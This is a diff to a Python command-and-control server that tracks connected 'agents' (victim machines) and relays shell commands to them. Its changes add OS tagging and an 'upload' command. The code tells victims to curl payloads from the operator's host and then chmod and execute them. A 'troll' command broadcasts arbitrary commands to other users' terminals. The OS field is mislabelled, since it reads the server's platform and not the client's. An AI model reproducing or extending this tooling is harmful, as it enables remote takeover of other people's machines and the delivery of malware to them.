@@ -102,6 +102,8 @@ _________________________________________________________
 conn_list = {}
 
 
+import platform
+
 def server(HOST, PORT):
     global conn_list
 
@@ -112,22 +114,24 @@ def server(HOST, PORT):
     while True:
         conn, addr = s.accept()
         client_id = str(uuid.uuid4())
-        conn_list[client_id] = conn
-        conn_list[client_id] = {"Connection": conn, "IP": addr[0]}
+        os_info = platform.platform()
+        if "Linux" in os_info:
+            os_info = "Linux"
+        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info}
+
 
 def list_agents():
     global conn_list
+
     data = [] 
     agents = 0
     if conn_list:
-        for key, value in conn_list.items():
+        for client_id, client_info in conn_list.items():
             agents += 1
             agent_char = random.choice(characters.agent_chars)
-            data.append([agents, key, value["IP"], agent_char])
-        headers = ["Agents", "Key", "IP", "Character"]
+            data.append([agents, client_id, client_info["IP"], agent_char, client_info["OS"]])
+        headers = ["Agents", "ID", "IP", "Character", "OS"]
         print(tabulate(data, headers=headers, tablefmt="grid"))
-    else:
-        print(f"{Nicecolors.red}[ERROR] No active agents{Nicecolors.reset}")
 
 def kill_agent(agent_key):
     global conn_list
@@ -175,11 +179,11 @@ def cmd_interact(conn, victim, socket_target):
             ready, _, _ = select.select([conn, sys.stdin], [], [], 1)
 
             if conn in ready:
-                data = conn.recv(8912).decode('utf-8') 
+                data = conn.recv(8912).decode('utf-8')
                 if not data:
                     command = input()
                     conn.sendall(command.encode('utf-8') + b'\n')
-                    output = conn.recv(8912).decode('utf-8') 
+                    output = conn.recv(8912).decode('utf-8')
                     print(output)
                 else:
                     print(data, end='')
@@ -189,17 +193,17 @@ def cmd_interact(conn, victim, socket_target):
                 if command.lower() == "quit" or command.lower() == "exit":
                     break
                 
-                if command.lower() == "show payloads": 
+                if command.lower() == "show payloads":
                     print(banners.payloads_man)
                 
                 tmp_var = command.lower().split(' ')
-                if "set" in command.lower(): 
-                    if tmp_var[0] == "set": 
-                        if tmp_var[1] == "payload":  
+                if "set" in command.lower():
+                    if tmp_var[0] == "set":
+                        if tmp_var[1] == "payload":
                             selected_payload = int(tmp_var[2])
                             if 0 < selected_payload <= len(banners.linux_payloads):
                                 payload = banners.linux_payloads[selected_payload-1][1]
-                                if 1 <= int(selected_payload) <= 5: 
+                                if 1 <= int(selected_payload) <= 5:
                                     cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/{payload} -O {payload}"
                                     conn.sendall(cmd.encode('utf-8') + b'\n')
                                     output = conn.recv(8912).decode('utf-8')
@@ -207,13 +211,27 @@ def cmd_interact(conn, victim, socket_target):
                                     cmd = f"chmod +x {payload}; ./{payload}"
                                     conn.sendall(cmd.encode('utf-8') + b'\n')
                                     output = conn.recv(8912).decode('utf-8')
-                                    print(output)
+                                    print(output) 
 
-                if command.lower() == "troll": 
+                elif tmp_var[0] == "upload": 
+                    url = tmp_var[1]
+                    try: 
+                        r = requests.get(url)
+                        file_name = url.split('/')[-1]
+                        cmd = f"curl {url} -O {file_name}"
+                        conn.sendall(cmd.encode('utf-8') + b'\n')
+                        output = conn.recv(8912).decode('utf-8')
+                        print(output) 
+
+                    except Exception as e:
+                        print(f"Error: {e}")
+                        
+
+                if command.lower() == "troll":
                     troll_command = input(f"[TROLL] > ")
                     troll = f"MY=$(tty|cut -d'/' -f4);for L in $(seq 5);do [ $MY == $L] && {{ echo 'Live'; }} || {{ {troll_command} > /dev/pts/$L 2>/dev/null & }};done 2>/dev/null"
                     conn.sendall(troll.encode('utf-8') + b'\n')
-                    output = conn.recv(8912).decode('utf-8') 
+                    output = conn.recv(8912).decode('utf-8')
                     print(output + "\n")
 
                 else:
@@ -223,6 +241,8 @@ def cmd_interact(conn, victim, socket_target):
 
     except Exception as e:
         print(f"Error: {e}")
+        del conn_list[socket_target]
+
 
 def server_status(host, web_port):
     print(f"[{Nicecolors.green}INFO{Nicecolors.reset}] Checking Web server status")
